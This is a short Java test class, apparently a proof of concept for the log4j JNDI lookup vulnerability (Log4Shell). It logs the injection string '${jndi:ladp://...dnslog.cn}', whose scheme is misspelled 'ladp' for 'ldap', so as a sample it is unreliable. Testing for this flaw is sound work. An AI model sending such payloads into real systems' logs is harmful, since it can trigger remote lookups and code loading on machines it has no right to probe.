package com.lzj.caffeine.deme.test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


/**
 * 
 *
 * @author Zijian Liao
 * @since 1.0.0
 */
public class LogTest {

    private static final Logger logger = LogManager.getLogger(LogTest.class);

     public static void main(String[] args) {
          String poc = "${jndi:ladp://k1lsdo.dnslog.cn}";
          logger.error("{}", poc);
     }
}
